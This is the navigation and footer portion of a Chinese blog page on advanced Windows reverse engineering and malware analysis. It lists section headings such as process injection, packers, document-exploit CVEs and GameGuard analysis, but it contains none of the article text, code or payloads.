toc-level-4"><a class="toc-link" href="#push%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.3.2.</span> <span class="toc-text"> PUSH 指令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%80%E6%9C%89%E7%9A%84push%E9%83%BD%E6%98%AF%E5%B0%86esp-4"><span class="toc-number">1.2.3.2.1.</span> <span class="toc-text"> 所有的 push 都是将 esp-4?</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pop%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.3.3.</span> <span class="toc-text"> POP 指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pushad%E5%92%8Cpopad%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.3.4.</span> <span class="toc-text"> PUSHAD 和 POPAD 指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pushfd%E5%92%8Cpopfd%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.3.5.</span> <span class="toc-text"> PUSHFD 和 POPFD 指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.3.6.</span> <span class="toc-text"> 其它相关指令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 标志寄存器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#eflags"><span class="toc-number">1.2.4.0.1.</span> <span class="toc-text"> EFLAGS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 条件跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jcc%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.5.1.</span> <span class="toc-text"> JCC 指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jmp%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.5.2.</span> <span class="toc-text"> JMP 指令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E5%87%BD%E6%95%B0-%E8%A3%B8%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.6.</span> <span class="toc-text"> 空函数 &#x2F; 裸函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c-%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3"><span class="toc-number">1.2.7.</span> <span class="toc-text"> C 程序入口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%92%8C%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F"><span class="toc-number">1.2.8.</span> <span class="toc-text"> 全局变量和局部变量</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.2.8.1.</span> <span class="toc-text"> 全局变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F"><span class="toc-number">1.2.8.2.</span> <span class="toc-text"> 局部变量</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="toc-number">1.2.9.</span> <span class="toc-text"> 类型转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84"><span class="toc-number">1.2.10.</span> <span class="toc-text"> 数组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.2.11.</span> <span class="toc-text"> 结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90"><span class="toc-number">1.2.12.</span> <span class="toc-text"> 内存对齐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E9%92%88"><span class="toc-number">1.2.13.</span> <span class="toc-text"> 指针</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c"><span class="toc-number">1.3.</span> <span class="toc-text"> C++</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%9A%E8%A1%A8%E6%8C%87%E9%92%88"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 虚表指针</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 继承</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#this"><span class="toc-number">1.3.3.</span> <span class="toc-text"> this</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%90%E6%9E%84%E5%92%8C%E6%9E%84%E9%80%A0%E8%AF%86%E5%88%AB"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 析构和构造识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 调用约定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEreadmin%E5%AF%B9%E8%AF%9Dcall"><span class="toc-number">1.3.6.</span> <span class="toc-text"> 寻找 readmin 对话 call</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80"><span class="toc-number">1.4.</span> <span class="toc-text"> 动态调试基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tls%E5%9B%9E%E8%B0%83-fs0"><span class="toc-number">1.4.1.</span> <span class="toc-text"> TLS 回调  fs:[0]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%99%A8%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 调试器原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%99%A8%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.4.2.1.</span> <span class="toc-text"> 调试器原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#od"><span class="toc-number">1.4.3.</span> <span class="toc-text"> OD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windbg"><span class="toc-number">1.4.4.</span> <span class="toc-text"> Windbg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#intel-vt"><span class="toc-number">1.4.5.</span> <span class="toc-text"> Intel-vt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#radmin-%E5%AF%B9%E8%AF%9Dcall%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.4.6.</span> <span class="toc-text"> radmin 对话 call 模拟</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.7.</span> <span class="toc-text"> 硬件断点原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E6%96%AD%E7%82%B9"><span class="toc-number">1.4.8.</span> <span class="toc-text"> 软件断点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ida"><span class="toc-number">1.5.</span> <span class="toc-text"> IDA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 目录结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BF%AB%E6%8D%B7%E9%94%AE"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 快捷键</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E4%BB%A3%E7%A0%81"><span class="toc-number">1.5.3.</span> <span class="toc-text"> 伪代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="toc-number">1.5.4.</span> <span class="toc-text"> 远程调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pe"><span class="toc-number">1.6.</span> <span class="toc-text"> PE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E8%A1%A8"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 导出表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%8A%82%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 基址重定位节原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8"><span class="toc-number">1.7.</span> <span class="toc-text"> Windows 系统安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.7.1.</span> <span class="toc-text"> 系统进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.7.2.</span> <span class="toc-text"> 进程对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B"><span class="toc-number">1.7.3.</span> <span class="toc-text"> 线程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8"><span class="toc-number">1.7.4.</span> <span class="toc-text"> 内核</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.5.</span> <span class="toc-text"> 进程注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#createremotethread"><span class="toc-number">1.7.5.1.</span> <span class="toc-text"> CreateRemoteThread</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rtlcreateuserthread%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.5.2.</span> <span class="toc-text"> RtlCreateUserThread 类型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%BC%8Fdll%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.5.3.</span> <span class="toc-text"> 反射式 dll 注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dll-%E5%8A%AB%E6%8C%81"><span class="toc-number">1.7.6.</span> <span class="toc-text"> DLL 劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E8%A1%A8%E6%84%9F%E6%9F%93"><span class="toc-number">1.7.7.</span> <span class="toc-text"> 输入表感染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E7%89%B9%E6%9D%83"><span class="toc-number">1.7.8.</span> <span class="toc-text"> 进程特权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90"><span class="toc-number">1.8.</span> <span class="toc-text"> 恶意脚本快速分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#vbs%E8%84%9A%E6%9C%AC%E7%97%85%E6%AF%92"><span class="toc-number">1.8.1.</span> <span class="toc-text"> vbs 脚本病毒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ast%E8%AF%AD%E6%B3%95%E6%A0%91"><span class="toc-number">1.8.2.</span> <span class="toc-text"> AST 语法树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vbs-%E8%84%9A%E6%9C%AC%E8%A7%A3%E9%87%8A%E5%99%A8"><span class="toc-number">1.8.3.</span> <span class="toc-text"> VBS 脚本解释器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edr-hips"><span class="toc-number">1.8.4.</span> <span class="toc-text"> EDR &amp; HIPS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#js-%E4%B8%8B%E8%BD%BD%E5%99%A8"><span class="toc-number">1.8.5.</span> <span class="toc-text"> js 下载器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%84%E5%88%99%E6%8F%90%E5%8F%96%E4%B8%8E%E6%9F%A5%E6%9D%80%E6%96%B9%E5%BC%8F"><span class="toc-number">1.8.6.</span> <span class="toc-text"> 规则提取与查杀方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6vbs"><span class="toc-number">1.8.7.</span> <span class="toc-text"> 二进制 vbs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Evbs%E6%9C%A8%E9%A9%AC%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">1.8.8.</span> <span class="toc-text"> 基于 VBS 木马攻击链分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BC%95%E6%93%8E"><span class="toc-number">1.8.9.</span> <span class="toc-text"> 基于恶意代码的机器学习引擎</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E6%A1%A3%E7%B1%BB%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6"><span class="toc-number">1.9.</span> <span class="toc-text"> 文档类恶意文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2012-0158"><span class="toc-number">1.9.1.</span> <span class="toc-text"> CVE-2012-0158</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89payload%E4%B8%ADshellcode%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95"><span class="toc-number">1.9.2.</span> <span class="toc-text"> 自定义 payload 中 shellcode 调试方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2017-0199"><span class="toc-number">1.9.3.</span> <span class="toc-text"> CVE-2017-0199</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pe%E7%B1%BB%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.10.</span> <span class="toc-text"> PE 类恶意程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pedoll"><span class="toc-number">1.10.1.</span> <span class="toc-text"> PEDoll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pedoll-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.10.2.</span> <span class="toc-text"> PEDoll 源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dll%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">1.10.3.</span> <span class="toc-text"> DLL 加载器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87dll%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E5%8A%A0%E8%BD%BD%E8%B0%83%E8%AF%95"><span class="toc-number">1.10.4.</span> <span class="toc-text"> 通过 dll 导出函数进行加载调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%81%AB%E7%BB%92hips%E8%BF%9B%E8%A1%8C%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90"><span class="toc-number">1.10.5.</span> <span class="toc-text"> 使用火绒 HIPS 进行快速分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exe-%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.11.</span> <span class="toc-text"> EXE 恶意文件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="toc-number">1.11.1.</span> <span class="toc-text"> 解密函数分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B7%E6%9C%AC%E8%A7%84%E5%88%99%E5%BA%93%E7%BC%96%E5%86%99"><span class="toc-number">1.11.2.</span> <span class="toc-text"> 样本规则库编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E6%B2%99%E7%9B%98api%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.11.3.</span> <span class="toc-text"> 云沙盘 API 使用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apt%E6%94%BB%E5%87%BB%E9%93%BE%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90"><span class="toc-number">1.12.</span> <span class="toc-text"> APT 攻击链恶意样本分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Esigspy%E6%96%87%E4%BB%B6"><span class="toc-number">1.12.1.</span> <span class="toc-text"> 关于 Sigs.py 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nazar-%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90"><span class="toc-number">1.12.2.</span> <span class="toc-text"> Nazar 样本分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%BB%91%E6%A0%B7%E6%9C%AC%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90"><span class="toc-number">1.13.</span> <span class="toc-text"> 白 + 黑样本快速分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%A3%B3"><span class="toc-number">1.14.</span> <span class="toc-text"> 加壳</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%85%8D%E6%9D%80%E5%A3%B3"><span class="toc-number">1.14.0.1.</span> <span class="toc-text"> 恶意软件免杀壳</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E8%B0%83%E8%AF%95%E5%8E%9F%E7%90%86"><span class="toc-number">1.14.0.2.</span> <span class="toc-text"> 反调试原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E5%8A%A0%E5%A3%B3%E5%8E%9F%E7%90%86"><span class="toc-number">1.14.1.</span> <span class="toc-text"> 手工加壳原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="toc-number">1.14.2.</span> <span class="toc-text"> 加密函数分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90-2"><span class="toc-number">1.14.3.</span> <span class="toc-text"> 解密函数分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86ip%E5%88%86%E6%9E%90"><span class="toc-number">1.14.4.</span> <span class="toc-text"> 解密 IP 分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nprotect"><span class="toc-number">1.15.</span> <span class="toc-text"> nprotect</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nprotect-gameguard-ini%E6%96%87%E4%BB%B6%E7%A0%B4%E8%A7%A3%E6%89%8B%E6%B3%95%E4%B9%8B%E8%A7%A3%E5%AF%86%E5%90%8E%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%80"><span class="toc-number">1.15.1.</span> <span class="toc-text"> NProtect GameGuard ini 文件破解手法之解密后的文件（一）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nprotect-gameguard-ini%E6%96%87%E4%BB%B6%E7%A0%B4%E8%A7%A3%E6%89%8B%E6%B3%95%E4%B9%8B%E8%A7%A3%E5%AF%86%E5%87%BD%E6%95%B0%E4%BA%8C"><span class="toc-number">1.15.2.</span> <span class="toc-text"> NProtect GameGuard ini 文件破解手法之解密函数（二）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%B8%E6%88%8F%E6%A3%80%E6%B5%8B%E7%9A%84%E5%AF%B9%E6%8A%97%E4%B8%8E%E9%98%B2%E6%8A%A4%E8%89%BA%E6%9C%AF"><span class="toc-number">1.16.</span> <span class="toc-text"> 游戏检测的对抗与防护艺术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#call%E7%9A%84%E6%A3%80%E6%B5%8B%E5%8E%9F%E7%90%86"><span class="toc-number">1.16.1.</span> <span class="toc-text"> call 的检测原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B"><span class="toc-number">1.16.2.</span> <span class="toc-text"> 虚拟机检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dll-%E9%9A%90%E8%97%8F"><span class="toc-number">1.16.3.</span> <span class="toc-text"> DLL 隐藏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B0%83%E7%94%A8%E6%A0%88%E5%8F%8Acall%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">1.16.4.</span> <span class="toc-text"> 基于调用栈及 CALL 检测方法（一）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mmprotect%E7%99%BB%E5%BD%95%E5%99%A8%E4%BF%9D%E6%8A%A4%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%88%86%E6%9E%90%E4%B8%80"><span class="toc-number">1.17.</span> <span class="toc-text"> MMProtect 登录器保护介绍与分析（一）</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
        <ul>
          <li><a href="/2022/11/01/%E6%B1%87%E7%BC%96/" rel="bookmark" title="汇编">汇编</a></li><li><a href="/2022/11/11/reverse/" rel="bookmark" title="逆向">逆向</a></li><li><a href="/2023/01/03/%E6%BB%B4%E6%B0%B4reverse/" rel="bookmark" title="水滴rev">水滴rev</a></li><li><a href="/2023/08/15/%E7%A0%B4%E8%A7%A3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%B9%8B%E8%AE%A4%E8%AF%86%E5%A3%B3%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%89%B9%E5%BE%81/" rel="bookmark" title="破解基础知识之认识壳与程序的特征">破解基础知识之认识壳与程序的特征</a></li><li><a href="/2023/08/22/%E5%8E%BB%E5%BC%B9%E7%AA%97%E7%BB%BF%E5%8C%96/" rel="bookmark" title="破解相关">破解相关</a></li><li class="active"><a href="/2023/10/01/1234567/" rel="bookmark" title="windows逆向进阶">windows逆向进阶</a></li><li><a href="/2023/10/03/hg%20ker/" rel="bookmark" title="hg内核">hg内核</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="John Doe"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">John Doe</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">46</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">6</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">6</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2023/09/15/%E7%BC%93%E5%AD%98%E6%B1%A1%E6%9F%93/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2023/10/03/hg%20ker/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
</div>

    <span><a href="/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/" title="秋招总结">秋招总结</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E7%BD%91%E7%BB%9C/" title="In 网络">网络</a>
</div>

    <span><a href="/2023/01/20/VXLAN/" title="VXLAN">VXLAN</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/02/28/XSS/" title="XSS">XSS</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E8%BF%90%E7%BB%B4/" title="In 运维">运维</a>
</div>

    <span><a href="/2023/04/03/iptables2/" title="iptables">iptables</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E8%BF%90%E7%BB%B4/" title="In 运维">运维</a>
</div>

    <span><a href="/2022/11/27/CDN/" title="CDN&amp;DNS">CDN&DNS</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/12/27/SSTI/" title="SSTI">SSTI</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" title="SQL injection">SQL injection</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E8%BF%90%E7%BB%B4/" title="In 运维">运维</a>
</div>

    <span><a href="/2024/01/25/%E8%99%9A%E6%8B%9F%E5%8C%96/" title="虚拟化">虚拟化</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/12/28/mysql/" title="Mysql">Mysql</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
</div>

    <span><a href="/2023/10/03/hg%20ker/" title="hg内核">hg内核</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2023/10/01/1234567/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)Booooom"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
